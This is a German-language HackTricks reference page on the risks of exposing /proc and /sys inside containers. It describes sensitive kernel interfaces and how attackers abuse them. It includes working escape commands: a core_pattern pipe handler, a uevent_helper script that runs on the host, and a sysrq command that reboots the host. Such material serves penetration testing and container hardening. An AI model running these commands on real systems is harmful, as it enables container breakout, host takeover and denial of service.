<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>


Die Offenlegung von `/proc` und `/sys` ohne ordnungsgemäße Namespace-Isolierung birgt erhebliche Sicherheitsrisiken, einschließlich einer Vergrößerung der Angriffsfläche und der Offenlegung von Informationen. Diese Verzeichnisse enthalten sensible Dateien, die bei falscher Konfiguration oder Zugriff durch einen nicht autorisierten Benutzer zu einem Ausbruch aus dem Container, zur Modifikation des Hosts oder zur Bereitstellung von Informationen führen können, die weitere Angriffe unterstützen. Wenn beispielsweise `-v /proc:/host/proc` falsch eingebunden wird, kann dies aufgrund seiner pfadbasierten Natur den AppArmor-Schutz umgehen und `/host/proc` ungeschützt lassen.

**Weitere Details zu jeder potenziellen Schwachstelle finden Sie unter [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts).**

# procfs-Schwachstellen

## `/proc/sys`
Dieses Verzeichnis ermöglicht den Zugriff auf die Modifikation von Kernelvariablen, normalerweise über `sysctl(2)`, und enthält mehrere Unterordner von Interesse:

### **`/proc/sys/kernel/core_pattern`**
- Beschrieben in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Ermöglicht die Definition eines Programms, das bei der Generierung von Core-Dateien mit den ersten 128 Bytes als Argumente ausgeführt wird. Dies kann zu Codeausführung führen, wenn die Datei mit einem Pipe-Zeichen `|` beginnt.
- **Beispiel für Test und Ausnutzung**:
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Ja # Test auf Schreibzugriff
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Benutzerdefinierten Handler festlegen
sleep 5 && ./crash & # Handler auslösen
```

### **`/proc/sys/kernel/modprobe`**
- Ausführlich beschrieben in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Enthält den Pfad zum Kernelmodullader, der zum Laden von Kernelmodulen aufgerufen wird.
- **Beispiel zur Überprüfung des Zugriffs**:
```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Zugriff auf modprobe überprüfen
```

### **`/proc/sys/vm/panic_on_oom`**
- Referenziert in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Ein globaler Schalter, der steuert, ob der Kernel bei einem OOM-Zustand in Panik gerät oder den OOM-Killer aufruft.

### **`/proc/sys/fs`**
- Gemäß [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) enthält es Optionen und Informationen zum Dateisystem.
- Schreibzugriff kann verschiedene Denial-of-Service-Angriffe gegen den Host ermöglichen.

### **`/proc/sys/fs/binfmt_misc`**
- Ermöglicht die Registrierung von Interpretern für nicht native Binärformate basierend auf ihrer Magic Number.
- Kann zu Privilegieneskalation oder Root-Shell-Zugriff führen, wenn `/proc/sys/fs/binfmt_misc/register` beschreibbar ist.
- Relevanter Exploit und Erklärung:
- [Rootkit für arme Leute über binfmt_misc](https://github.com/toffan/binfmt_misc)
- Ausführliches Tutorial: [Video-Link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

## Andere in `/proc`

### **`/proc/config.gz`**
- Kann die Kernelkonfiguration offenlegen, wenn `CONFIG_IKCONFIG_PROC` aktiviert ist.
- Nützlich für Angreifer, um Schwachstellen im laufenden Kernel zu identifizieren.

### **`/proc/sysrq-trigger`**
- Ermöglicht das Auslösen von Sysrq-Befehlen, die potenziell sofortige Systemneustarts oder andere kritische Aktionen verursachen können.
- **Beispiel zum Neustarten des Hosts**:
```bash
echo b > /proc/sysrq-trigger # Startet den Host neu
```

### **`/proc/kmsg`**
- Stellt Kernel-Ringpuffermeldungen bereit.
- Kann bei Kernel-Exploits, Adresslecks und der Bereitstellung sensibler Systeminformationen helfen.

### **`/proc/kallsyms`**
- Listet exportierte Kernel-Symbole und ihre Adressen auf.
- Wesentlich für die Entwicklung von Kernel-Exploits, insbesondere zur Überwindung von KASLR.
- Adressinformationen sind eingeschränkt, wenn `kptr_restrict` auf `1` oder `2` gesetzt ist.
- Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

### **`/proc/[pid]/mem`**
- Interagiert mit dem Kernel-Speichergerät `/dev/mem`.
- Historisch anfällig für Privilegieneskalationsangriffe.
- Weitere Informationen unter [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

### **`/proc/kcore`**
- Stellt den physischen Speicher des Systems im ELF-Core-Format dar.
- Das Lesen kann den Speicherinhalt des Hostsystems und anderer Container preisgeben.
- Eine große Dateigröße kann zu Leseproblemen oder Softwareabstürzen führen.
- Detaillierte Verwendung in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

### **`/proc/kmem`**
- Alternative Schnittstelle für `/dev/kmem`, die den virtuellen Speicher des Kernels darstellt.
- Ermöglicht das Lesen und Schreiben und damit die direkte Modifikation des Kernel-Speichers.

### **`/proc/mem`**
- Alternative Schnittstelle für `/dev/mem`, die den physischen Speicher darstellt.
- Ermöglicht das Lesen und Schreiben, die Modifikation des gesamten Speichers erfordert die Auflösung von virtuellen in physische Adressen.

### **`/proc/sched_debug`**
- Gibt Informationen zur Prozessplanung zurück und umgeht den PID-Namespace-Schutz.
- Stellt Prozessnamen, IDs und cgroup-Bezeichner offen.

### **`/proc/[pid]/mountinfo`**
- Bietet Informationen über Mountpoints im Mount-Namespace des Prozesses.
- Zeigt den Speicherort des Container-`rootfs` oder des Images an.

## `/sys`-Schwachstellen

### **`/sys/kernel/uevent_helper`**
- Wird zum Umgang mit Kernelgeräte-`uevents` verwendet.
- Das Schreiben in `/sys/kernel/uevent_helper` kann beliebige Skripte bei `uevent`-Auslösungen ausführen.
- **Beispiel für Ausnutzung**:
%%%bash
# Erstellt eine Payload
echo "#!/bin/sh" > /evil-helper
echo "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Ermittelt den Hostpfad aus dem OverlayFS-Mount für den Container
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
# Setzt uevent_helper auf bösartigen Helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Löst ein uevent aus
echo change > /sys/class/mem/null/uevent
# Liest die Ausgabe
cat /output
%%%
### **`/sys/class/thermal`**
- Steuert Temperatureinstellungen und kann potenziell DoS-Angriffe oder physische Schäden verursachen.

### **`/sys/kernel/vmcoreinfo`**
- Leakt Kernel-Adressen und gefährdet potenziell KASLR.

### **`/sys/kernel/security`**
- Beherbergt die `securityfs`-Schnittstelle, die die Konfiguration von Linux Security Modules wie AppArmor ermöglicht.
- Der Zugriff könnte einem Container ermöglichen, sein MAC-System zu deaktivieren.

### **`/sys/firmware/efi/vars` und `/sys/firmware/efi/efivars`**
- Bietet Schnittstellen zur Interaktion mit EFI-Variablen im NVRAM.
- Fehlkonfiguration oder Ausnutzung kann zu unbrauchbaren Laptops oder nicht bootfähigen Host-Maschinen führen.

### **`/sys/kernel/debug`**
- `debugfs` bietet eine "no rules" Debugging-Schnittstelle zum Kernel.
- Es gab bereits Sicherheitsprobleme aufgrund seiner uneingeschränkten Natur.


## Referenzen
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie Pull Requests an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
